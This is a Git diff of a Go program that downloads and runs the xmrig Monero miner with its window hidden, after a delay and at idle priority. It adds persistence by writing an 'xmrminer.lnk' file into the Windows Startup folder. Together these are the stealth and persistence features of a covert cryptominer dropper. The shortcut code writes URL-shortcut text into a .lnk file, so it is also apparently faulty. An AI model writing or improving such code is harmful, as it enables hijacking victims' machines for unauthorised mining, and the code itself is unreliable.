@@ -13,8 +13,14 @@ import (
 	"strings"
 	"syscall"
 	"time"
-//	"os/user"
+	"golang.org/x/sys/windows"
+	"os/user"
 // 	"os/signal"
+)
+
+const (
+	PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000
+	PROCESS_MODE_BACKGROUND_END   = 0x00200000
 )
 
 func downloadFile(filepath string, url string) (err error) {
@@ -111,14 +117,29 @@ func unzipFile(f *zip.File, destination string) error {
 }
 
 func startCommand(dir string) {
-	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-
 	time.Sleep(60*time.Second)
+
+	cmd := exec.Command(filepath.Join(dir, "xmrcache", "xmrig.exe"), "-c", filepath.Join(dir, "xmrcache", "config.json"))
+
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
 	if err := cmd.Start(); err != nil {
 		log.Printf("Failed to start cmd: %v", err)
-		return
+	}
+
+	handle, err := syscall.OpenProcess(windows.PROCESS_SET_INFORMATION, false, uint32(cmd.Process.Pid))
+	if err != nil {
+		log.Println("Error getting process handle:", err)
+	}
+
+//	err := syscall.Setpriority(syscall.PRIO_PROCESS, cmd.Process.Pid, 10)
+//	if err != nil {
+//		log.Println("Error setting process priority:", err)
+//	}
+
+	err = windows.SetPriorityClass(windows.Handle(handle), windows.IDLE_PRIORITY_CLASS)
+	if err != nil {
+		log.Println("Error setting process priority:", err)
 	}
 
 	// And when you need to wait for the command to finish:
@@ -168,27 +189,40 @@ func copy(src, dst string) error {
 	return nil
 }
 
-func autostart() {
-	// Get the path of the current executable
-	exePath, err := os.Executable()
+func createShortcut(shortcutPath string, targetPath string) error {
+	shortcut, err := os.Create(shortcutPath)
 	if err != nil {
-		log.Println("Failed to get the executable path:", err)
-		return
+		return err
 	}
+	defer shortcut.Close()
 
-	// Create a command to execute the Windows Task Scheduler
-	cmd := exec.Command("schtasks", "/create", "/tn", "xmrminer", "/tr", exePath, "/sc", "ONLOGON")
+	shortcut.WriteString("[InternetShortcut]\n")
+	shortcut.WriteString("URL=file:///" + targetPath + "\n")
+	shortcut.WriteString("IconIndex=0\n")
+	shortcut.WriteString("IconFile=" + targetPath + "\n")
+	shortcut.Sync()
 
-	// Run the command
-	err = cmd.Run()
-	if err != nil {
-		log.Println("Failed to create the task:", err)
-		return
-	}
-
-	log.Println("Task created successfully.")
+	return nil
 }
 
+func autostart() {
+	u, err := user.Current()
+	if err != nil {
+		log.Printf("Error getting current user: %s\n", err)
+	}
+	startupFolder := filepath.Join(u.HomeDir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+
+	shortcutPath := filepath.Join(startupFolder, "xmrminer.lnk")
+	targetPath, err := os.Executable()
+	if err != nil {
+		log.Printf("Error getting executable path: %s\n", err)
+	}
+
+	err = createShortcut(shortcutPath, targetPath)
+	if err != nil {
+		log.Printf("Error creating shortcut: %s\n", err)
+	}
+}
 
 func main() {
 	f, err := os.OpenFile("log.txt", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
